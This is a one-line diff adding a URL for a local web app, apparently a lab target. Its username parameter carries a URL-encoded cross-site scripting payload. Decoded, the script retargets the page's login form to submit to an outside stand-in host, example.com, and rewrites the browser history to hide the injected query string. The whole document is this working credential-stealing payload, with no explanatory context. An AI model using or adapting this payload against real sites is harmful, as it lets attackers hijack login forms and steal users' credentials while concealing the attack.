@@ -1,0 +1,1 @@
+http://localhost:8081/?uname=%22%3E%3Cscript%3E%0A%20%20%20%20var%20loginForm%20%3D%20document.forms%5B0%5D%3B%0A%20%20%20%20loginForm.action%20%3D%20%27http%3A%2F%2Fexample.com%2F%27%3B%0A%20%20%20%20window.history.replaceState%28%22object%20or%20string%22%2C%20%22Title%22%2C%20%22%2F%22%29%3B%0A%3C%2Fscript%3E%3Cinput%20type%3D%22hidden%22%20value%3D%22
